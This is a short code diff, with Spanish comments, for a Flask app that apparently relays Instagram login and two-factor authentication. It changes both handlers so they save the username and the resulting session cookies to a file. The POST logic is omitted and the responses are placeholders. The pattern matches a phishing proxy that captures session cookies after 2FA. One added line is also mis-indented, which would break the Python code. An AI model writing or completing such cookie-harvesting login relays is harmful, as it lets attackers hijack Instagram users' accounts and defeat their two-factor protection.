@@ -94,7 +94,7 @@ def handle_step1():
     # ... (Tu lógica para hacer el POST a Instagram - CÓDIGO OMITIDO) ...
     
     # 🚨 CAMBIO CRUCIAL: Si el login es exitoso en tu lógica, la llamada DEBE SER:
-    # save_to_file(username, final_cookies) 
+     save_to_file(username, final_cookies) 
     
     return jsonify({"success": True, "message": "Placeholder"})
 
@@ -104,7 +104,7 @@ def handle_step2():
     # ... (Tu lógica de 2FA - CÓDIGO OMITIDO) ...
     
     # 🚨 CAMBIO CRUCIAL: Si el 2FA es exitoso, la llamada DEBE SER:
-    # save_to_file(temp_data['username'], final_cookies)
+    save_to_file(temp_data['username'], final_cookies)
     
     return jsonify({"success": True, "message": "Placeholder"})
 
